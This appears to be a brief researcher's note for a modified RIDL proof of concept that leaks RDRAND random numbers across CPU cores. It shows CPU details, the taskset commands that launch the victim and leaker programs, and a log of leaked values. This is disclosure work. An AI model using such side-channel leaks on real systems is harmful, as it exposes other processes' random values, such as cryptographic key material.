VUSec RIDL cpuid_leak PoC, modified to leak rdrand output
July 2019

The 'runme.sh' script runs call_rdrand on core 4, and then leak_rdrand on cores 3/7.
Transcript:

$ cat /proc/cpuinfo
model name      : Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz
stepping        : 9
microcode       : 0xb4
[...]
processor       : 3
core id         : 3
processor       : 4
core id         : 0
[...]
processor       : 7
core id         : 3

$ sh runme.sh
running leak_rdrand and call_rdrand in background
# taskset -c 4 ./call_rdrand &
# taskset -c 3,7 ./leak_rdrand &
rdrand: random number: c70a18f2
leaking rdrand: c70a18f2
leaking rdrand: c70a18f2
leaking rdrand: c70a18f2
leaking rdrand: c70a18f2
rdrand: random number: f38405b2
leaking rdrand: c70a18b2
leaking rdrand: f38405b2
leaking rdrand: f38405b2
leaking rdrand: f38405b2
leaking rdrand: f38405b2
rdrand: random number: fb4ec1d6
leaking rdrand: f384c1d6
leaking rdrand: fb4ec1d6
leaking rdrand: fb4ec1d6
leaking rdrand: fb4ec1d6
leaking rdrand: fb4ec1d6
rdrand: random number: 3696aa0e
leaking rdrand: 3696aa0e
leaking rdrand: 3696aaa6
leaking rdrand: f4b080a6
leaking rdrand: f4b080a6
rdrand: random number: 56acad6b
leaking rdrand: f4b0806b
leaking rdrand: 56acad6b
leaking rdrand: 56acad6b
leaking rdrand: 56acad6b
leaking rdrand: 56acad6b
rdrand: random number: d8b0a6b6
leaking rdrand: 56aca6b6
leaking rdrand: d8b0a6b6
leaking rdrand: d8b0a6b6
leaking rdrand: d8b0a6b6
leaking rdrand: d8b0a6b6
done, killing processes

